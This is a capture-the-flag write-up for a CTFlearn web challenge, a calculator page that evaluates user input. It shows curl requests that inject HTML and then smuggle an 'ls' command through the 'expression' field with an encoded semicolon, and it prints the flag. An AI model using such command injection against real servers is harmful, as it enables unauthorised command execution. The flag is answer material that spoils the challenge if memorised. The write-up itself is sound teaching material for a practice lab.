## Calculat3 M3
### Difficulty: Hard

> Here! http://web.ctflearn.com/web7/ I forget how we were doing those calculations, 
> but something tells me it was pretty insecure.

![image of calculator](https://i.imgur.com/gvtxCqE.png)

On opening the page, we get a calculator. Checking the source code shows how it works. The main function there is the `eval` function in the javascript code which can be a bad exploit. The eval function there can be used other than the calculating function like running commands and html injection into the page. 

![image of javascript code](https://i.imgur.com/YGrvD5O.png)

The calculator uses post method to calculate the inputs. Here we are sending the inputs via the name `expression`

![image of html code](https://i.imgur.com/HDZsQYO.png)

Next I used curl to send POST requests. Sending html code appended it into the site's source. Note: I converted my request into url format because of command line syntax

```
┌──(gr33pp㉿machine)-[~]
└─$ curl -d expression=%3Ch1%3EHelloworld%3C%2Fh1%3E -X POST https://web.ctflearn.com/web7/
<h1>Helloworld</h1>
<html>
<head>
  <link rel="stylesheet" href="main.css">
    <script type="text/javascript" src="calc.js"></script>

    </head>
    </body>
<div class="box">
<div class="display">
    <form action='.' method="post">
    <input type="text" name="expression" readonly size="18" id="d"></div>
<div class="keys">
    <p><input type="button" class="button gray"
    value="mrc" onclick='c("Created....................")'>
    <input type="button" class="button gray"
    value="m-" onclick='c("...............by............")'>
    <input type="button" class="button gray" value="
    m+" onclick='c(".....................Anoop")'>
    <input type="button" class="button pink"
    value="/ " onclick='v("/ ")'></p>
    <p><input type="button" class="button black"
    value="7 " onclick='v("7 ")'><input type="button"
    class="button black" value="8" onclick='v("8 ")'>
    <input type="button" class="button black" value="9 "
    ......

```

I tried escaping the eval main function with semi-colon and run os commands. Semi colon is %3B in url format and boom we are able to list the directory

```
┌──(gr33pp㉿kali)-[~]
└─$ curl -d expression=%3Bls -X POST https://web.ctflearn.com/web7/
calc.js
ctf{watch_0ut_f0r_th3_m0ng00s3}
index.php
main.css
main.css
<html>
<head>
  <link rel="stylesheet" href="main.css">
    <script type="text/javascript" src="calc.js"></script>

    </head>
    </body>
<div class="box">
<div class="display">
    <form action='.' method="post">
    <input type="text" name="expression" readonly size="18" id="d"></div>
<div class="keys">
    <p><input type="button" class="button gray"
    value="mrc" onclick='c("Created....................")'>
    <input type="button" class="button gray"
    value="m-" onclick='c("...............by............")'>
    <input type="button" class="button gray" value="
    m+" onclick='c(".....................Anoop")'>
    <input type="button" class="button pink"
    value="/ " onclick='v("/ ")'></p>
    <p><input type="button" class="button black"
    value="7 " onclick='v("7 ")'><input type="button"
    class="button black" value="8" onclick='v("8 ")'>
    <input type="button" class="button black" value="9 "\
    .....
```

![image](https://i.imgur.com/sDSfHYk.png)

flag: `ctf{watch_0ut_f0r_th3_m0ng00s3}`
